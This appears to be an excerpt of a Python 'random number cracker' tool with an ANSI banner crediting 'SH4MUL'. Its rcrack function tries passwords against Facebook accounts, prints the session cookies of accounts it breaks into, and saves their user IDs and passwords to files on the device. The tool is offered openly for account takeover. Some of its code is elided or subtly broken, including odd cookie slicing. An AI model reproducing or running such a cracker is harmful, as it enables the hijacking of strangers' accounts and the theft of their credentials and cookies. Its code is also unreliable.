...
\t\x1b[1;92m__       __   ______    ______   __    __ 
\t\x1b[1;92m/  \     /  | /      \  /      \ /  \  /  |
\t\x1b[1;92m$$  \   /$$ |/$$$$$$  |/$$$$$$  |$$  \ $$ |
\t\x1b[1;92m$$$  \ /$$$ |$$ |  $$ |$$ |  $$ |$$$  \$$ |
\t\x1b[1;92m$$$$  /$$$$ |$$ |  $$ |$$ |  $$ |$$$$  $$ |
...
\t\x1b[1;92m$$/      $$/  $$$$$$/   $$$$$$/  $$/   $$/ 
     ...
     \33[1;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗               
                  \x1b[97m\033[37;41m LOVE YOU ILMA  \033[0;m  
     \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                                                            
                                           

\033[1;32m══════════════════════════════════════════════════════
\033[1;32m[👬]  \033[1;32mCREATED BY\33    :  \033[1;33mMD SHIMUL\33[0;m\033[1;32m
\033[1;32m[👬]  \033[1;32mMR        : \033[1;34m SH4MUL
\033[1;32m[👬]  \033[1;32mFACEBOOK     :  \033[1;35mMD SHIMUL
\033[1;32m[👬]  \033[1;32mTOOL VERSION :  \033[1;36m1.1
\033[1;32m[👬]  \033[1;32mTOOL TYPE    : \033[1;32m FREE
\033[1;92m══════════════════════════════════════════════════════
""")

def o():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/md.shimul.705874')
    print(xxx)
    jalan('\t\tRANDOM NUMBER CRACKER')
    print('\033[1;32m─────────────────────────────────────────────────────────')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:66]
                print('    \033[1;32m(SH4MUL-OK😍”¥)  ' +uid+ ' | ' +ps+    '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;32m'+coki+  ' \n\033[1;33m [🤧] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                open('/sdcard/SH4MUL-OK😍.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:56]
                print('    \33[1;31m(SH4MUL-CP•)  ' +uid+ ' | ' +ps+           '  \33[1;33m')
                open('/sdcard/TURAG-404-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r%s[SH4MUL] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
